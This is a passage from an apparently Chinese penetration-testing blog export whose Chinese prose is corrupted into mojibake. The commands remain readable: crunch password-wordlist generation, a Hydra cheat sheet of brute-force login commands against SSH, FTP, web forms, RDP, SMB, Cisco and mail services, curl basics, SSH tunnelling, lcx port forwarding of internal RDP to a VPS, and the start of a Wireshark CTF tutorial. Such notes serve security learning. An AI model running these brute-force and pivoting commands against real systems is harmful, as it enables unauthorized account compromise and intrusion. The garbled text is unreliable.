è®ºæ•°å­—æ˜¯å¤šå°‘ï¼Œä½†æ˜¯å¿…é¡»è¦æœ‰ã€‚\nroot@kali:~# crunch 5 5 -p abc \nabc\nacb\n\n#ç”Ÿæˆ   ä½†æ˜¯å‰é¢æ— è®ºæ•°å­—æ˜¯å¤šå°‘ï¼Œä½†æ˜¯å¿…é¡»è¦æœ‰ã€‚\nroot@kali:~#crunch 4 5 -p dog cat bird\nbirdcatdog, birddogcat, catbirddog, catdogbird, dogbirdcat, dogcatbird.\n\n#ç”Ÿæˆæœ€å°ä¸º1ä½æœ€å¤§ä¸º5ä½æ‰€æœ‰å°å®šå­—æ¯çš„å¯†ç å­—å…¸ï¼Œå…¶ä¸­æ¯ä¸ªæ–‡ä»¶åŒ…å«6000ä¸ªå¯†ç ï¼Œå¹¶å°†å¯†ç æ–‡ä»¶ä¿å­˜ä¸ºbz2æ–‡ä»¶.è¾“å‡ºæ–‡ä»¶æ ¼å¼ä¸ºfirst_word-last_word.txt.bz2\nroot@kali:~#crunch 1 5 -o START -c 6000 -z bzip2\n\n#ç”Ÿæˆ aaaa-gvfed.txt, gvfee-ombqy.txt, ombqz-wcydt.txt, wcydu-zzzzz.txt  æ¯ä¸ªæ–‡ä»¶å¤§å°ä¸º20M\nroot@kali:~#  crunch 4 5 -b 20mib -o START\n\n\n#ç”Ÿæˆ4ä½å¯†ç ï¼Œå…¶ä¸­å¯†ç æ ¼å¼ä¸ºâ€ä¸¤ä¸ªæ•°å­—â€œ+ä¸€ä¸ªå°å­—æ¯+å¸¸è§„ç¬¦å·ï¼ˆå…¶ä¸­æ•°å­—è¿™é‡Œè¢«æŒ‡123ç»„æˆçš„æ‰€æœ‰2ä½æ’åˆ—ç»„åˆï¼‰ã€‚\nroot@kali:~#crunch 4 4  + + 123 + -t %%@^\n\n\n#ç”Ÿæˆ5ä¸ªæ— ç´ ç»„æˆå¯†ç ï¼Œå…¶ä¸­å‰ä¸‰ä¸ªä¸ºdog cat birdæ’åˆ—ç»„åˆï¼Œåé¢ä¸¤ä¸ªä¸ºå°å†™å­—æ¯ã€‚\nroot@kali:~# crunch 5 5 -t ddd@@ -o j -p dog cat bird\n\n\n#ç”Ÿæˆ7ä½å¯†ç  æ ¼å¼â€p@ss+å¤§å†™å­—æ¯+æ•°å­—+å¸¸è§„å­—ç¬¦â€œ   -l ä¸­@å¯¹-té‡Œé¢çš„@è¿›è¡Œäº†è½¬ä¹‰\nroot@kali:~#crunch 7 7 -t p@ss,%^ -l a@aaaaa\n\n#ç”Ÿæˆå¯†ç ä¸º5ä½ï¼Œæ ¼å¼ä¸ºâ€3ä¸ªå­—æ¯+ä¸‰ä¸ªæ•°å­—ã€‚â€œ -d 2@ é™åˆ¶æ¯ä¸ªå¯†ç æœ€å°‘å‡ºç°2ç§å­—æ¯.\nroot@kali:~#crunch 5 5 -d 2@ -t @@@%%\n\n#ç”Ÿæˆå¯†ç ä¸º10ä½ ï¼Œæ ¼å¼â€ä¸‰ä¸ªå°å­—æ¯+ä¸€ä¸ªå¸¸è§„ç¬¦å·+4ä¸ªæ•°å­—+ä¸¤ä¸ªå¸¸è§„ç¬¦å·â€œ ï¼Œé™åˆ¶æ¯ä¸ªå¯†ç è‡³å°‘2ç§å°å†™å­—æ¯å’Œè‡³å°‘ä¸‰ä¸ªæ•°å­—ã€‚å¹¶ä¸”æ¯ä¸ªæ–‡ä»¶ä¸º20Mï¼Œæ–‡ä»¶åä¸ºSTARTçš„æ ¼å¼ã€‚\nroot@kali:~# crunch 10 10 -t @@@^%%%%^^ -d 2@ -d 3% -b 20mb -o START  \n\n\n#ç”Ÿæˆ8ä½å¯†ç ï¼Œæ¯ä¸ªå¯†ç è‡³å°‘å‡ºç°2ç§å­—æ¯ã€‚\nroot@kali:~# crunch 8 8 -d 2@ \n\n```\n\n## Hydra-æš´åŠ›å¯†ç ç ´è§£å·¥å…·\n\n### è¯­æ³•å’Œå‚æ•°\n\n```bash\nhydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns]\n[-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]\n\n-R ç»§ç»­ä»ä¸Šä¸€æ¬¡è¿›åº¦æ¥ç€ç ´è§£ã€‚\n-S é‡‡ç”¨SSLé“¾æ¥ã€‚\n-s PORT å¯é€šè¿‡è¿™ä¸ªå‚æ•°æŒ‡å®šéé»˜è®¤ç«¯å£ã€‚\n-l LOGIN æŒ‡å®šç ´è§£çš„ç”¨æˆ·ï¼Œå¯¹ç‰¹å®šç”¨æˆ·ç ´è§£ã€‚\n-L FILE æŒ‡å®šç”¨æˆ·åå­—å…¸ã€‚\n-p PASS å°å†™ï¼ŒæŒ‡å®šå¯†ç ç ´è§£ï¼Œå°‘ç”¨ï¼Œä¸€èˆ¬æ˜¯é‡‡ç”¨å¯†ç å­—å…¸ã€‚\n-P FILE å¤§å†™ï¼ŒæŒ‡å®šå¯†ç å­—å…¸ã€‚\n-e ns å¯é€‰é€‰é¡¹ï¼Œnï¼šç©ºå¯†ç è¯•æ¢ï¼Œsï¼šä½¿ç”¨æŒ‡å®šç”¨æˆ·å’Œå¯†ç è¯•æ¢ã€‚\n-C FILE ä½¿ç”¨å†’å·åˆ†å‰²æ ¼å¼ï¼Œä¾‹å¦‚â€œç™»å½•å:å¯†ç â€æ¥ä»£æ›¿-L/-På‚æ•°ã€‚\n-M FILE æŒ‡å®šç›®æ ‡åˆ—è¡¨æ–‡ä»¶ä¸€è¡Œä¸€æ¡ã€‚\n-o FILE æŒ‡å®šç»“æœè¾“å‡ºæ–‡ä»¶ã€‚\n-f åœ¨ä½¿ç”¨-Må‚æ•°ä»¥åï¼Œæ‰¾åˆ°ç¬¬ä¸€å¯¹ç™»å½•åæˆ–è€…å¯†ç çš„æ—¶å€™ä¸­æ­¢ç ´è§£ã€‚\n-t TASKS åŒæ—¶è¿è¡Œçš„çº¿ç¨‹æ•°ï¼Œé»˜è®¤ä¸º16ã€‚\n-w TIME è®¾ç½®æœ€å¤§è¶…æ—¶çš„æ—¶é—´ï¼Œå•ä½ç§’ï¼Œé»˜è®¤æ˜¯30sã€‚\n-v / -V æ˜¾ç¤ºè¯¦ç»†è¿‡ç¨‹ã€‚\nserver ç›®æ ‡ip\nservice æŒ‡å®šæœåŠ¡å\n```\n\n### ç ´è§£ssh\n\n```bash\nhydra -l ç”¨æˆ·å -p å¯†ç å­—å…¸ -t çº¿ç¨‹ -vV -e ns ip ssh\nhydra -l ç”¨æˆ·å -p å¯†ç å­—å…¸ -t çº¿ç¨‹ -o save.log -vV ip ssh\n```\n\n### ç ´è§£ftp\n\n```bash\nhydra ip ftp -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -t çº¿ç¨‹(é»˜è®¤16) -vV\nhydra ip ftp -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -e ns -vV\n```\n\n### getæ–¹å¼æäº¤ï¼Œç ´è§£webç™»å½•\n\n```bash\nhydra -l ç”¨æˆ·å -p å¯†ç å­—å…¸ -t çº¿ç¨‹ -vV -e ns ip http-get /admin/\nhydra -l ç”¨æˆ·å -p å¯†ç å­—å…¸ -t çº¿ç¨‹ -vV -e ns -f ip http-get /admin/index.php\n```\n\n### postæ–¹å¼æäº¤ï¼Œç ´è§£webç™»å½•\n\n```bash\n\nhydra -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -s 80 ip http-post-form \"/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password\"\n\nhydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form \"login.php:id=^USER^&passwd=^PASS^:<title>wrong username or password</title>\"\n\nï¼ˆå‚æ•°è¯´æ˜ï¼š-tåŒæ—¶çº¿ç¨‹æ•°3ï¼Œ-lç”¨æˆ·åæ˜¯adminï¼Œå­—å…¸pass.txtï¼Œä¿å­˜ä¸ºout.txtï¼Œ-f å½“ç ´è§£äº†ä¸€ä¸ªå¯†ç å°±åœæ­¢ï¼Œ 10.36.16.18ç›®æ ‡ipï¼Œhttp-post-formè¡¨ç¤ºç ´è§£æ˜¯é‡‡ç”¨httpçš„postæ–¹å¼æäº¤çš„è¡¨å•å¯†ç ç ´è§£,<title>ä¸­çš„å†…å®¹æ˜¯è¡¨ç¤ºé”™è¯¯çŒœè§£çš„è¿”å›ä¿¡æ¯æç¤ºã€‚ï¼‰\n```\n\n### ç ´è§£https\n\n```bash\nhydra -m /index.php -l muts -P pass.txt 10.36.16.18 https\n```\n\n### ç ´è§£teamspeak\n\n```bash\n\nhydra -l ç”¨æˆ·å -P å¯†ç å­—å…¸ -s ç«¯å£å· -vV ip teamspeak\n```\n\n### ç ´è§£cisco\n\n```bash\nhydra -P pass.txt 10.36.16.18 cisco\nhydra -m cloud -P pass.txt 10.36.16.18 cisco-enable\n```\n\n### ç ´è§£smb\n\n```bash\nhydra -l administrator -P pass.txt 10.36.16.18 smb\n```\n\n### ç ´è§£pop3\n\n```bash\nhydra -l muts -P pass.txt my.pop3.mail pop3\n```\n\n### ç ´è§£rdp\n\n```bash\nhydra ip rdp -l administrator -P pass.txt -V\n```\n\n### ç ´è§£http-proxy\n\n```bash\nhydra -l admin -P pass.txt http-proxy://10.36.16.18\n```\n\n### ç ´è§£imap\n\n```bash\nhydra -L user.txt -p secret 10.36.16.18 imap PLAIN\nhydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN\n```\n\nè¯¦ç»†è¯·çœ‹ï¼š[ï¼ˆæ€»ç»“ï¼‰Linuxä¸‹çš„æš´åŠ›å¯†ç åœ¨çº¿ç ´è§£å·¥å…·Hydraè¯¦è§£](http://www.ha97.com/5186.html)\n\n## curl-å‘½ä»¤è¡Œæ–‡ä»¶ä¼ è¾“å·¥å…·\n\n### ç”¨æ³•ç¤ºä¾‹\n\n```bash\n#ä¸å¸¦æœ‰ä»»ä½•å‚æ•°æ—¶ï¼Œcurl å°±æ˜¯å‘å‡º GET è¯·æ±‚ã€‚\ncurl https://www.example.com\n\n#-Aå‚æ•°æŒ‡å®šå®¢æˆ·ç«¯çš„ç”¨æˆ·ä»£ç†æ ‡å¤´ï¼Œå³User-Agent\ncurl -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36' https://google.com\n\n#-bå‚æ•°ç”¨æ¥å‘æœåŠ¡å™¨å‘é€ Cookieã€‚\ncurl -b 'foo1=bar;foo2=bar2' https://google.com\n\n#-då‚æ•°ç”¨äºå‘é€ POST è¯·æ±‚çš„æ•°æ®ä½“ã€‚\n$ curl -d 'login=emmaï¼†password=123'-X POST https://google.com/login\n# æˆ–è€…\n$ curl -d 'login=emma' -d 'password=123' -X POST  https://google.com/login\n\n#-eå‚æ•°ç”¨æ¥è®¾ç½® HTTP çš„æ ‡å¤´Referer -Hå‚æ•°å¯ä»¥é€šè¿‡ç›´æ¥æ·»åŠ æ ‡å¤´Refererè¾¾åˆ°åŒæ ·æ•ˆæœã€‚\ncurl -e 'https://google.com?q=example' https://www.example.com\næˆ–è€…\ncurl -H 'Referer: https://google.com?q=example' https://www.example.com\n\n#-Hå‚æ•°æ·»åŠ  HTTP è¯·æ±‚çš„æ ‡å¤´ã€‚\ncurl -H 'Accept-Language: en-US' -H 'Content-Type: application/json' https://google.com\n\n#-iå‚æ•°æ‰“å°å‡ºæœåŠ¡å™¨å›åº”çš„ HTTP æ ‡å¤´\ncurl -i https://www.example.com\n\n#-uå‚æ•°ç”¨æ¥è®¾ç½®æœåŠ¡å™¨è®¤è¯çš„ç”¨æˆ·åå’Œå¯†ç ã€‚\ncurl -u 'bob:12345' https://google.com/login\n\n#-vå‚æ•°è¾“å‡ºé€šä¿¡çš„æ•´ä¸ªè¿‡ç¨‹ï¼Œç”¨äºè°ƒè¯•ã€‚\ncurl -v https://www.example.com\n\n#-Xå‚æ•°æŒ‡å®š HTTP è¯·æ±‚çš„æ–¹æ³•ã€‚\ncurl -X POST https://www.example.com\n```\n\næ›´å¤šè¯¦ç»†è¯·çœ‹ï¼š[curl çš„ç”¨æ³•æŒ‡å—](http://www.ruanyifeng.com/blog/2019/09/curl-reference.html)\n\n## SSHç«¯å£è½¬å‘\n\n### åŸºç¡€çŸ¥è¯†\n\n**ç«¯å£è½¬å‘å‰æœåŠ¡å™¨å¿…é¡»åšå¦‚ä¸‹é…ç½®ï¼š**\n\n```bash\n#1.å…è®¸ä»»ä½•äººè¿æ¥åˆ°è½¬å‘çš„ç«¯å£\nvim /etc/ssh/sshd_config\nå°†#GatewayPorts no ä¿®æ”¹ä¸º GatewayPorts yes\n\n#2.é‡å¯sshæœåŠ¡\nservice sshd restart\næˆ–è€…\nsystemctl restart sshd\n```\n\n **SSHè¯­æ³•ï¼š**\n\n```bash\nssh [options] [-l login_name][user@]hostname [command]\n```\n\n**åˆ›å»ºSSHéš§é“çš„å¸¸ç”¨å‚æ•°å¦‚ä¸‹ï¼š**\n\n```bash\n-Cï¼šå‹ç¼©æ•°æ®ä¼ è¾“\n-fï¼šå°†SSHä¼ è¾“è½¬å…¥åå°æ‰§è¡Œï¼Œä¸å å½“å‰çš„Shell,é€šå¸¸å’Œ-Nè¿ç”¨\n-Nï¼šåªå¸Œæœ›å»ºç«‹éš§é“ï¼Œè€Œä¸ä¼šåœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œä»»ä½•æŒ‡ä»¤\n-Tï¼šåªå¸Œæœ›å»ºç«‹éš§é“ï¼Œå› è€Œä¸éœ€è¦åˆ›å»ºè™šæ‹Ÿç»ˆç«¯\n-gï¼šå…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°ç”¨äºè½¬å‘çš„ç«¯å£\n-Lï¼šæœ¬åœ°ç«¯å£è½¬å‘\n-Rï¼šè¿œç¨‹ç«¯å£è½¬å‘\n-Dï¼šåŠ¨æ€è½¬å‘\n-Pï¼šæŒ‡å®šSSHç«¯å£\n-q å®‰é™æ¨¡å¼ï¼Œä¸è¾“å‡ºé”™è¯¯/è­¦å‘Šä¿¡æ¯\n```\n\n### æœ¬åœ°ç«¯å£è½¬å‘\n\næ„æˆæ¡ä»¶ï¼šæœ¬åœ°ç½‘æ— æ³•è®¿é—®ç§ç½‘ï¼Œæœ¬åœ°ç½‘å¯ä»¥è®¿é—®äº‘æœåŠ¡å™¨ï¼Œäº‘æœåŠ¡å™¨å¯ä»¥è®¿é—®ç§ç½‘\n\n![æœ¬åœ°ç«¯å£è½¬å‘](https://img.jwt1399.top//img/20200906105347.png)\n\n**å°†æœ¬åœ°æœºçš„æŸä¸ªç«¯å£è½¬å‘åˆ°è¿œç«¯ç›®æ ‡æœºå™¨çš„æŒ‡å®šç«¯å£ï¼š**\n\n```bash\nssh  -CfNg -L æœ¬åœ°IP:æœ¬åœ°port:ç§ç½‘IP:ç§ç½‘port æœåŠ¡å™¨ç”¨æˆ·å@æœåŠ¡å™¨IP\n```\n\n**å®ä¾‹**\n\n> **åœºæ™¯æè¿°ï¼š**äº‘æœåŠ¡å™¨ä¸Šæœ‰ä¸€ä¸ªWebæœåŠ¡ï¼Œç«¯å£8080ï¼Œä½†æ˜¯å®‰å…¨ç»„æ²¡æœ‰å¼€æ”¾8080ç«¯å£ï¼Œå› æ­¤æœ¬åœ°æ— æ³•è®¿é—®è¯¥æœåŠ¡ï¼Œæ€æ ·æ‰èƒ½è®©æœ¬åœ°è®¿é—®åˆ°WebæœåŠ¡å‘¢ï¼Ÿ\n\né¦–å…ˆç¡®ä¿æœåŠ¡å™¨è¿›è¡Œäº†å‰é¢çš„ç«¯å£è½¬å‘å‰é…ç½®(æ‰“å¼€GatewayPorts)ï¼Œç„¶åæ‰§è¡Œä¸‹æ–¹å‘½ä»¤\n```bash\nssh  -CfNg -L 192.168.137.1:8088:localhost:8080 root@139.224.112.182\n```\n\nè¿è¡Œå‘½ä»¤ï¼Œè¾“å…¥å¯†ç åï¼Œæœ¬åœ°è®¿é—® `192.168.137.1:8088`æˆ–è€… `localhost:8088`å°±å¯ä»¥è®¿é—®åˆ°äº‘æœåŠ¡å™¨çš„ Web æœåŠ¡\n\n### è¿œç¨‹ç«¯å£è½¬å‘\n\næ„æˆæ¡ä»¶ï¼šæœ¬åœ°ç½‘æ— æ³•è®¿é—®ç§ç½‘ï¼Œæœ¬åœ°ç½‘å¯ä»¥è®¿é—®äº‘æœåŠ¡å™¨ï¼Œç§ç½‘ä¹Ÿå¯ä»¥è®¿é—®äº‘æœåŠ¡å™¨\n\n![è¿œç¨‹ç«¯å£è½¬å‘](https://img.jwt1399.top//img/20200906105357.png)\n\n**å°†è¿œç¨‹ä¸»æœº(æœåŠ¡å™¨)çš„æŸä¸ªç«¯å£è½¬å‘åˆ°ç›®æ ‡æœºå™¨çš„æŒ‡å®šç«¯å£ï¼š**\n\n```bash\nssh  -CfNg -R è¿œç¨‹IP:æœåŠ¡å™¨port:å†…ç½‘IP:å†…ç½‘port  æœåŠ¡å™¨ç”¨æˆ·å@æœåŠ¡å™¨IP\n```\n\n**å®ä¾‹**\n\n> **åœºæ™¯æè¿°ï¼š**æœ¬åœ°ä¸»æœºè¿è¡Œäº†ä¸€ä¸ªWebæœåŠ¡ï¼Œç«¯å£ä¸º80ï¼Œæ€ä¹ˆè®©å…¶ä»–äººä¹Ÿèƒ½è®¿é—®è¿™ä¸ªWebæœåŠ¡ï¼Ÿ\n\né¦–å…ˆç¡®ä¿æœåŠ¡å™¨è¿›è¡Œäº†å‰é¢çš„ç«¯å£è½¬å‘å‰é…ç½®(æ‰“å¼€GatewayPorts)ï¼Œç„¶åæœåŠ¡å™¨å®‰å…¨ç»„æ‰“å¼€8088ç«¯å£ï¼Œç„¶åæ‰§è¡Œä¸‹æ–¹å‘½ä»¤\n\n```bash\nssh -CfNg -R 0.0.0.0:8088:192.168.137.1:80 root@139.224.112.182\n\n# 0.0.0.0è¡¨ç¤ºvpsä¸Šç›‘å¬æ‰€æœ‰åœ°å€ï¼Œå³æ‰€æœ‰äººå¯è®¿é—®\n```\n\nè¿è¡Œå‘½ä»¤ï¼Œè¾“å…¥å¯†ç åï¼Œå…¶ä»–äººè®¿é—® `139.224.112.182:8088` å°±å¯ä»¥è®¿é—®åˆ°æˆ‘æœ¬åœ°çš„ Web æœåŠ¡äº†\n\n**å…¶ä»–ç›¸å…³å‘½ä»¤:**\n\n```bash\nnetstat -anp|grep 8088 #æ£€éªŒç«¯å£çš„ç½‘ç»œè¿æ¥æƒ…å†µ\nkillall ssh #ç»ˆæ­¢sshæ‰€æœ‰è¿›ç¨‹\n```\n\nå‚è€ƒï¼š\n\n[æœ€ä½³æ­æ¡£ï¼šåˆ©ç”¨æ­£å SSH éš§é“ç©¿é€é˜²ç«å¢™è®¿é—®å†…ç½‘æœåŠ¡å™¨](https://liam.page/2018/04/11/break-firewall-by-the-use-of-SSH-tunnel/)\n\n[ç©è½¬SSHç«¯å£è½¬å‘](https://zhuanlan.zhihu.com/p/26547381)\n\n[Bç«™SSHç«¯å£è½¬å‘](https://www.bilibili.com/video/BV1C7411P7Er?p=1)\n\n## lcxç«¯å£è½¬å‘\n\n> lcxæ˜¯ä¸€æ¬¾å¼ºå¤§çš„å†…ç½‘ç«¯å£è½¬å‘å·¥å…·ï¼Œç”¨äºå°†å†…ç½‘ä¸»æœºå¼€æ”¾çš„å†…éƒ¨ç«¯å£æ˜ å°„åˆ°å¤–ç½‘ä¸»æœºï¼ˆæœ‰å…¬ç½‘IPï¼‰ä»»æ„ç«¯å£ã€‚Windowsç‰ˆæ˜¯lcx.exe,Linuxç‰ˆä¸ºportmap\n\n\n\n```bash\nå†…ç½‘ç«¯å£è½¬å‘ï¼š\nlcx.exe -slave vps 3333 127.0.0.1 3389\nlcx.exe -listen 3333 4444\næœ¬åœ°ç«¯å£è½¬å‘ï¼š\nlcx.exe -tran 21 ä¸»æœºIP 3389 #å°†3389ç«¯å£è½¬å‘åˆ°å…¶ä»–ç«¯å£\n```\n\n","tags":["æ¸—é€æµ‹è¯•"],"categories":["Tools"]},{"title":"CTF-æµé‡åˆ†ææ€»ç»“","url":"/posts/29176.html","content":"åœ¨CTFæ¯”èµ›ä¸­ï¼Œå¯¹äºæµé‡åŒ…çš„åˆ†æå–è¯æ˜¯ä¸€ç§ååˆ†é‡è¦çš„é¢˜å‹ã€‚é€šå¸¸è¿™ç±»é¢˜ç›®éƒ½æ˜¯ä¼šæä¾›ä¸€ä¸ªåŒ…å«æµé‡æ•°æ®çš„`pcap`æ–‡ä»¶ï¼Œé€‰æ‰‹é€šè¿‡è¯¥æ–‡ä»¶ç­›é€‰å’Œè¿‡æ»¤å…¶ä¸­æ— å…³çš„æµé‡ä¿¡æ¯ï¼Œæ ¹æ®å…³é”®æµé‡ä¿¡æ¯æ‰¾å‡ºflagæˆ–è€…ç›¸å…³çº¿ç´¢,ä¸€èˆ¬flagéšè—åœ¨æŸä¸ªæ•°æ®åŒ…é‡Œé¢ï¼Œæˆ–è€…éœ€è¦ä»ä¸­æå–ä¸€ä¸ªæ–‡ä»¶å‡ºæ¥ç­‰ç­‰ï¼Œè¿˜æœ‰wifiçš„æ¡æ‰‹åŒ…ï¼Œéœ€è¦è·å–wifiå¯†ç ç­‰ã€‚\n\n## é™„ä»¶ä¸‹è½½\n\næœ¬æ–‡ç« æ¶‰åŠçš„æ‰€æœ‰é¢˜ç›®é™„ä»¶ä¸‹è½½åœ°å€ï¼š\né“¾æ¥ï¼šhttps://pan.baidu.com/s/18mWo5vn1zp_XbmcQrMOKRA \næå–ç ï¼šhrc4 \n\n## Wiresharkçš„ä½¿ç”¨\n\nä¸‹è½½åœ°å€ï¼šhttps://www.wireshark.org/download.html\n`pcapæµé‡åŒ…`çš„åˆ†æé€šå¸¸æ˜¯é€šè¿‡å›¾å½¢åŒ–çš„ç½‘ç»œå—…æ¢å™¨â€”â€”`Wireshark`è¿›è¡Œçš„.\nWiresharkçš„åŸºæœ¬ä½¿ç”¨åˆ†ä¸ºæ•°æ®åŒ…ç­›é€‰ã€æ•°æ®åŒ…æœç´¢ã€æ•°æ®åŒ…è¿˜åŸã€æ•°æ®æå–å››ä¸ªéƒ¨åˆ†ã€‚\n\n### æ•°æ®åŒ…ç­›é€‰\n#### ç­›é€‰ip\n\n>æºipç­›é€‰\n\n**æ–¹æ³•ä¸€ï¼š**\n\n```\nip.src == æºipåœ°å€\n```\n![](https://img.jwt1399.top//img/20201230113252.png)\n\n**æ–¹æ³•äºŒï¼š**\né€‰ä¸­ä¸€ä¸ªæºIPæ˜¯ç­›é€‰æ¡ä»¶çš„æ•°æ®åŒ…ï¼Œæ‰¾åˆ°`Internet Protocol Version 4`ä¸‹çš„`Source`å­—æ®µã€‚\n\n![](https://img.jwt1399.top//img/20201230113315.png)\n\nå³å‡»`Source`å­—æ®µï¼Œå†é€‰æ‹©`ä½œä¸ºè¿‡æ»¤å™¨åº”ç”¨` â€“-> æœ€åç‚¹å‡»`é€‰ä¸­`ï¼Œå°±å¯ç­›é€‰å‡ºè¯¥æºIPçš„æ‰€æœ‰åŒ…äº†\n\n![](https://img.jwt1399.top//img/20201230113348.png)\n\n>ç›®çš„ipç­›é€‰\n\n**æ–¹æ³•ä¸€ï¼š**\n\n```\nip.dst == ç›®çš„ipåœ°å€\n```\n![](https://img.jwt1399.top//img/20201230113452.png)\n\n**æ–¹æ³•äºŒï¼š**\nè·Ÿä¸Šé¢æºIPç­›é€‰æ–¹æ³•ç±»ä¼¼\n\né€‰ä¸­ä¸€ä¸ªæºIPæ˜¯ç­›é€‰æ¡ä»¶çš„æ•°æ®åŒ…ï¼Œæ‰¾åˆ°`Internet Protocol Version 4`ä¸‹çš„`Destination`å­—æ®µã€‚\n\nå³å‡»`Destination`å­—æ®µï¼Œå†é€‰æ‹©`ä½œä¸ºè¿‡æ»¤å™¨åº”ç”¨` â€“-> æœ€åç‚¹å‡»`é€‰ä¸­`ï¼Œå°±å¯ç­›é€‰å‡ºè¯¥ç›®çš„IPçš„æ‰€æœ‰åŒ…äº†\n\n\n#### macåœ°å€ç­›é€‰\n```\neth.dst ==A0:00:00:04:C5:84 ç­›é€‰ç›®æ ‡macåœ°å€\n\neth.addr==A0:00:00:04:C5:84 ç­›é€‰MACåœ°å€\n```\n#### ç«¯å£ç­›é€‰\n```\ntcp.dstport == 80  ç­›é€‰tcpåè®®çš„ç›®æ ‡ç«¯å£ä¸º80çš„æµé‡åŒ…\n\ntcp.srcport == 80  ç­›é€‰tcpåè®®çš„æºç«¯å£ä¸º80çš„æµé‡åŒ…\n\nudp.srcport == 80  ç­›é€‰udpåè®®çš„æºç«¯å£ä¸º80çš„æµé‡åŒ…\n```\n#### åè®®ç­›é€‰\n```\ntcp  ç­›é€‰åè®®ä¸ºtcpçš„æµé‡åŒ…\n\nudp ç­›é€‰åè®®ä¸ºudpçš„æµé‡åŒ…\n\narp/icmp/http/ftp/dns/ip  ç­›é€‰åè®®ä¸ºarp/icmp/http/ftp/dns/ipçš„æµé‡åŒ…\n```\n #### åŒ…é•¿åº¦ç­›é€‰\n```\nudp.length ==20   ç­›é€‰é•¿åº¦ä¸º20çš„udpæµé‡åŒ…\n\ntcp.len >=20  ç­›é€‰é•¿åº¦å¤§äº20çš„tcpæµé‡åŒ…\n\nip.len ==20  ç­›é€‰é•¿åº¦ä¸º20çš„IPæµé‡åŒ…\n\nframe.len ==20 ç­›é€‰é•¿åº¦ä¸º20çš„æ•´ä¸ªæµé‡åŒ…\n```\n\n\n #### httpè¯·æ±‚ç­›é€‰\n```\nè¯·æ±‚æ–¹æ³•ä¸ºGETï¼šhttp.request.method==â€œGETâ€        ç­›é€‰HTTPè¯·æ±‚æ–¹æ³•ä¸ºGETçš„ æµé‡åŒ…\n\nè¯·æ±‚æ–¹æ³•ä¸ºPOSTï¼šhttp.request.method==â€œPOSTâ€      ç­›é€‰HTTPè¯·æ±‚æ–¹æ³•ä¸ºPOSTçš„æµé‡åŒ…\n\næŒ‡å®šURIï¼šhttp.request.uri==â€œ/img/logo-edu.gifâ€  ç­›é€‰HTTPè¯·æ±‚çš„URLä¸º/img/logo-edu.gifçš„æµé‡åŒ…\n\nè¯·æ±‚æˆ–ç›¸åº”ä¸­åŒ…å«ç‰¹å®šå†…å®¹ï¼šhttp contains â€œFLAGâ€    ç­›é€‰HTTPå†…å®¹ä¸º/FLAGçš„æµé‡åŒ…\n```\n### æ•°æ®åŒ…æœç´¢\n\nåœ¨wiresharkç•Œé¢æŒ‰â€œCtrl+Fâ€ï¼Œå¯ä»¥è¿›è¡Œå…³é”®å­—æœç´¢ï¼š\n\n![](https://img.jwt1399.top//img/20201230113551.png)Wiresharkçš„æœç´¢åŠŸèƒ½æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼ã€å­—ç¬¦ä¸²ã€åå…­è¿›åˆ¶ç­‰æ–¹å¼è¿›è¡Œæœç´¢ï¼Œé€šå¸¸æƒ…å†µä¸‹ç›´æ¥ä½¿ç”¨å­—ç¬¦ä¸²æ–¹å¼è¿›è¡Œæœç´¢ã€‚\n![](https://img.jwt1399.top//img/20201230113616.png)\næœç´¢æ çš„å·¦è¾¹ä¸‹æ‹‰ï¼Œæœ‰åˆ†ç»„åˆ—è¡¨ã€åˆ†ç»„è¯¦æƒ…ã€åˆ†ç»„å­—èŠ‚æµä¸‰ä¸ªé€‰é¡¹ï¼Œåˆ†åˆ«å¯¹åº”wiresharkç•Œé¢çš„ä¸‰ä¸ªéƒ¨åˆ†ï¼Œæœç´¢æ—¶é€‰æ‹©ä¸åŒçš„é€‰é¡¹ä»¥æŒ‡å®šæœç´¢åŒºåŸŸï¼š\n![](https://img.jwt1399.top//img/20201230113637.png)\n![](https://img.jwt1399.top//img/20201230113647.png)\n\n### æ•°æ®åŒ…è¿˜åŸ\n\nåœ¨wiresharkä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªè¿½è¸ªæµçš„åŠŸèƒ½ï¼Œå¯ä»¥å°†HTTPæˆ–TCPæµé‡é›†åˆåœ¨ä¸€èµ·å¹¶è¿˜åŸæˆåŸå§‹æ•°æ®ï¼Œå…·ä½“æ“ä½œæ–¹å¼å¦‚ä¸‹ï¼š\n\né€‰ä¸­æƒ³è¦è¿˜åŸçš„æµé‡åŒ…ï¼Œå³é”®é€‰ä¸­ï¼Œé€‰æ‹©è¿½è¸ªæµ â€“ TCPæµ/UPDæµ/SSLæµ/HTTPæµã€‚\n\n![](https://img.jwt1399.top//img/20201230114031.png)\n\nå¯åœ¨å¼¹å‡ºçš„çª—å£ä¸­çœ‹åˆ°è¢«è¿˜åŸçš„æµé‡ä¿¡æ¯ï¼š\n![](https://img.jwt1399.top//img/20201230114048.png)\n\n### æ•°æ®æå–\n\nWiresharkæ”¯æŒæå–é€šè¿‡httpä¼ è¾“ï¼ˆä¸Šä¼ /ä¸‹è½½ï¼‰çš„æ–‡ä»¶å†…å®¹ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š\n**è‡ªåŠ¨æå–é€šè¿‡httpä¼ 